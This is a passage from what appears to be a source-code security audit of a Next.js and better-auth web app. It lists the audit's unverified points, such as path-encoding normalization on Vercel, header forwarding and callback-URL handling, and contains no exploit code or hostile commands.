BUG-3, BUG-9). Each individual function is defensible in isolation; the mismatch only exists in the gap between them, which is precisely where per-change diff review never looks.\n\n---\n\n## depth_limits\n\n- **Not executed.** All findings are from source reading plus one isolated Node probe of the WHATWG `URL` parser (BUG-1). No dev server, no build, no requests to any deployed environment.\n- **BUG-8 unresolved:** whether Vercel's edge normalizes `%2F` before Next's route matcher, and whether `escapePathDelimiters` applies on the app-router dynamic path. Needs `curl -sI` against a running instance.\n- **BUG-4(b) unresolved:** did not verify Vercel's request-header forwarding policy for `x-pathname` empirically; based on documented behaviour. Largely moot since `headers()` forces dynamic rendering.\n- **Not traced:** better-auth's internal `trustedOrigins` handling of `callbackURL` (relevant to the magic-link leg of BUG-1).
